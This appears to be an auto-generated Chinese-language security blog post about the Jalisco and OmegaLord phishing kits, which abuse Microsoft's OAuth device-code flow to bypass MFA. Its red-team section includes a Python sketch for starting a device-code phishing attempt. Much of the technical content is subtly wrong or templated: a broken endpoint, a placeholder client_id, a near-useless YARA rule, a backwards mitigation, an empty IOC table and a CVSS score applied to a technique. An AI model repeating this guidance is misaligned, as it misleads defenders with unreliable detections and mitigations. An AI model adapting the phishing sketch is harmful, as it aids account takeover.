---
layout: post
title:  "New phishing kits target Microsoft 365 accounts, evade MFA"
date:   2026-07-14 13:18:13 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Microsoft 365 資安漏洞：Jalisco 和 OmegaLord 攻擊工具包
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Account Takeover
> * **關鍵技術**: OAuth 2.0 Device Authorization Grant, Social Engineering, MFA 繞過

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Jalisco 和 OmegaLord 攻擊工具包利用 OAuth 2.0 Device Authorization Grant 流程中的漏洞，通過社會工程學手段欺騙用戶授權攻擊者控制的設備存取 Microsoft 365 資訊。
* **攻擊流程圖解**:
  1. 攻擊者初始化登入請求到 Microsoft 服務。
  2. Microsoft 生成設備授權碼。
  3. 攻擊者通過社會工程學手段說服用戶登入合法的 Microsoft 登入頁面並輸入授權碼。
  4. 攻擊者控制的設備被授權存取用戶的 Microsoft 365 資訊。
* **受影響元件**: Microsoft 365、OAuth 2.0 Device Authorization Grant

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有社會工程學手段和 OAuth 2.0 Device Authorization Grant 流程的知識。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 初始化登入請求
    url = "https://login.microsoftonline.com/"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    data = {
        "grant_type": "device_code",
        "client_id": "your_client_id",
        "scope": "https://graph.microsoft.com/.default"
    }
    
    response = requests.post(url, headers=headers, data=data)
    
    # 取得設備授權碼
    device_code = response.json()["device_code"]
    
    # 社會工程學手段說服用戶授權設備
    print("請登入 Microsoft 365 並輸入以下授權碼：", device_code)
    
    ```
* **繞過技術**: Jalisco 攻擊工具包可以自動生成新的 Microsoft OAuth 設備授權碼，繞過 Microsoft 的 15 分鐘有效期限制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  |  |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Microsoft365_Phishing {
        meta:
            description = "Microsoft 365 Phishing Detection"
            author = "Your Name"
        strings:
            $url = "https://login.microsoftonline.com/"
            $device_code = "device_code"
        condition:
            $url and $device_code
    }
    
    ```
* **緩解措施**: 減少 Entra ID 設備註冊限制，封鎖設備授權碼驗證，限制 OAuth 設備授權。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth 2.0 Device Authorization Grant**: 一種 OAuth 2.0 授權流程，允許用戶授權設備存取其資訊。
* **社會工程學 (Social Engineering)**: 一種攻擊手段，利用人類心理和行為的弱點來取得授權或存取敏感資訊。
* **MFA (Multi-Factor Authentication)**: 一種安全機制，需要用戶提供多種驗證因素來授權存取其資訊。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-phishing-kits-target-microsoft-365-accounts-evade-mfa/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1114/)


